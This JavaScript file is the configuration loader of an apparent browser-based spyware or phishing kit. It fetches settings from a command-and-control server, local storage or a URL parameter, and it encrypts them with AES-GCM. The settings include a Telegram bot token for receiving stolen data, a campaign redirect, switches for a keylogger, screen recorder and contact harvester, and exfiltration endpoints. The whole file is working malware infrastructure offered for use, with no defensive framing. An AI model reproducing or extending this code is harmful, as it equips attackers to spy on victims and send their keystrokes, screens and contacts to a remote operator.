// language: JavaScript, file: config-loader.js
// *resolution order: window.APP_CONFIG → C2 remote → localStorage → sessionStorage → url param → throw*

const REMOTE_CONFIG_URL = 'https://your-c2-domain.com/api/config';

export async function loadConfig() {
    // 0. local config.js — dev shortcut, wins if present and filled
    if (typeof window !== 'undefined' && window.APP_CONFIG && window.APP_CONFIG.telegram) {
        const t = window.APP_CONFIG.telegram;
        // placeholder guard: reject only if token still says NEW_TOKEN / chat still says 123456789
        if (t.botToken && t.chatId &&
            !t.botToken.includes('NEW_TOKEN') && !t.chatId.includes('123456789')) {
            const cfg = {
                botToken: t.botToken,
                chatId: t.chatId,
                redirectUrl: window.APP_CONFIG.campaign?.redirect || null,
                enableScreenRecorder: window.APP_CONFIG.collectors?.enableScreenRecorder === true,
                enableKeylogger: window.APP_CONFIG.collectors?.enableKeylogger !== false,
                enableContacts: window.APP_CONFIG.collectors?.enableContacts !== false,
                websocketEndpoint: window.APP_CONFIG.exfil?.websocketEndpoint || null,
                restEndpoint: window.APP_CONFIG.exfil?.restEndpoint || null,
                restApiKey: window.APP_CONFIG.exfil?.restApiKey || null,
            };
            try { localStorage.setItem('tg_config', JSON.stringify(cfg)); } catch (e) {}
            return cfg;
        }
    }

    // 1. remote C2
    try {
        const resp = await fetch(REMOTE_CONFIG_URL, {
            cache: 'no-store',
            headers: { 'X-Requested-With': 'XMLHttpRequest' },
        });
        if (resp.ok) {
            const cfg = await resp.json();
            if (cfg.encrypted) {
                const key = resp.headers.get('X-Cfg-Key');
                const plain = await decryptConfig(cfg.data, cfg.iv, cfg.salt, key);
                if (plain && plain.botToken) {
                    try { localStorage.setItem('tg_config', JSON.stringify(plain)); } catch (e) {}
                    return plain;
                }
            }
            if (cfg.botToken) {
                try { localStorage.setItem('tg_config', JSON.stringify(cfg)); } catch (e) {}
                return cfg;
            }
        }
    } catch (e) {}

    // 2. localStorage → 3. sessionStorage
    for (const store of [localStorage, sessionStorage]) {
        try {
            const raw = store.getItem('tg_config');
            if (!raw) continue;
            const cfg = JSON.parse(raw);
            if (cfg && cfg.botToken) return cfg;
        } catch (e) {}
    }

    // 4. url param (base64 json)
    try {
        const p = new URLSearchParams(location.search).get('config');
        if (p) {
            const cfg = JSON.parse(atob(p));
            if (cfg && cfg.botToken) return cfg;
        }
    } catch (e) {}

    throw new Error('no config available — fill config.js or deploy a C2');
}

async function decryptConfig(encryptedData, iv, salt, keyStr) {
    if (!keyStr) throw new Error('no decryption key from C2');
    const enc = new TextEncoder();
    const km = await crypto.subtle.importKey(
        'raw', enc.encode(keyStr), { name: 'PBKDF2' }, false, ['deriveKey']
    );
    const key = await crypto.subtle.deriveKey(
        { name: 'PBKDF2', salt: enc.encode(salt), iterations: 100000, hash: 'SHA-256' },
        km, { name: 'AES-GCM', length: 256 }, false, ['decrypt']
    );
    const pt = await crypto.subtle.decrypt(
        { name: 'AES-GCM', iv: Uint8Array.from(atob(iv), c => c.charCodeAt(0)) },
        key, Uint8Array.from(atob(encryptedData), c => c.charCodeAt(0))
    );
    return JSON.parse(new TextDecoder().decode(pt));
}

export async function encryptConfig(configObj, keyStr, salt = 'per-deploy-salt') {
    const enc = new TextEncoder();
    const km = await crypto.subtle.importKey(
        'raw', enc.encode(keyStr), { name: 'PBKDF2' }, false, ['deriveKey']
    );
    const key = await crypto.subtle.deriveKey(
        { name: 'PBKDF2', salt: enc.encode(salt), iterations: 100000, hash: 'SHA-256' },
        km, { name: 'AES-GCM', length: 256 }, false, ['encrypt']
    );
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const ct = await crypto.subtle.encrypt(
        { name: 'AES-GCM', iv }, key, enc.encode(JSON.stringify(configObj))
    );
    const b64 = (buf) => btoa(String.fromCharCode(...new Uint8Array(buf)));
    return { encrypted: true, data: b64(ct), iv: b64(iv), salt };
}
